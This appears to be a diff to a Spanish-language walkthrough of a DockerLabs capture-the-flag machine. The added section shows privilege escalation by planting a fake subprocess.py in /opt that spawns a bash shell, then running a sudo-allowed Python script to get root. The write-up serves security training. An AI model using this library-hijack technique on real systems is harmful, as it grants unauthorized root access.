@@ -147,6 +147,7 @@ luisillo
 $ bash
 luisillo@b60671bc6147:/home/vaxei$
 ```
+## 3. 🚀 Escalada de Privilegios
 Logrando ingresar al usuario luisillo, realizamos la misma busqueda de binarios:
 ```bash
 sudo -l
@@ -234,9 +235,17 @@ def main():
 if __name__ == "__main__":
     main()
 ```
-Ya vimos que el error en sí viene de la llamada de la funcion 
-## 3. 🚀 Escalada de Privilegios
-*(¿Cómo pasamos de ser un usuario normal a ser Administrador o Root?)*
+Ya vimos que el error en sí viene de la llamada de la funcion `run_command()`, sabemos que python funciona buscando primero las librerias en la carpeta de origen del programa (en este caso `/opt/`), podemos aprovechar eso y generar una libreria falsa con el nombre `subprocess.py` que ejecute una consola con permisos de root.
+Creamos el archivo en la carpeta `/opt/`:
+```bash
+echo 'import pty; pty.spawn("/bin/bash")' > /opt/subprocess.py
+```
+Luego ejecutamos nuevamente el codigo:
+```bash
+sudo python3 /opt/paw.py
+root@dockerlabs:/home/luisillo# whoami
+root
+```
 
 
 ## 4. 🚩 Banderas (Flags)
